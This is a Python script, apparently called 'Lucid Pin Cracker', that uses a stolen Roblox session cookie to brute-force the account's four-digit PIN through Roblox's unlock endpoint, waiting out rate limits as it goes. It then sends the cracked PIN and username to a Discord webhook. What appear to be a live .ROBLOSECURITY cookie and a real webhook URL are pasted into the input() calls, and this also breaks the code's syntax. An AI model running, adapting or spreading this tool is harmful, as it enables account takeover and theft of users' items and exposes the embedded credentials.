import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_686BF53B8F9C002C75B668C1F6A2B1109C9CBE6C99A759C6DE19415CB0F1B0A0C08543436BD18FF0039465E3D964376506677D6F4FCA8EAFD9E681820B3B3664ED97902C6BE8595AE42FFDFB691A93E32FE0C0A65DA4703EC51F4EAFAC78F166E7060FB123A7E13B2E2E1F60958C04CFDBAE0176D2AC77753863200A62FEAD00AD5DE4BD2527CEFC12B066F0AE9169D4B9F58BC99E43AF558233B59BD0DDB35214F3536F367763280136A8B1DA620AA011FABDD4A762CCEDFC2B85929FFC4836284437FD5E623C96BC0AE13A4BA302DB4FCFBA35ABA63F3391A40510836902884FB7CE787D252E0E1FD61DE91002C380C18AB7ECDE6F0BE673229F4726C0F7E8F5A4485DDBB6539DC7C22B480E01854846F1D5B41B1956903F085E6A4A33D984A0DD0311E86F06B08472A9B870BD88ADDEF27D5884E07F23095125E264B77D927C3312E21555C973E4A5E831608AC5487E898C8A7D5C924CD0E45E187582917331811FA9F2A643400B04C4160B3B60400805703E)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/1004060964381007945/W562IawU6gaIeZdLQvnpKtk-Wc43_0R22fShRIu4d1tEMYDgYJ2mWJf99rneLrvsI7YJ
)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input(N)
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



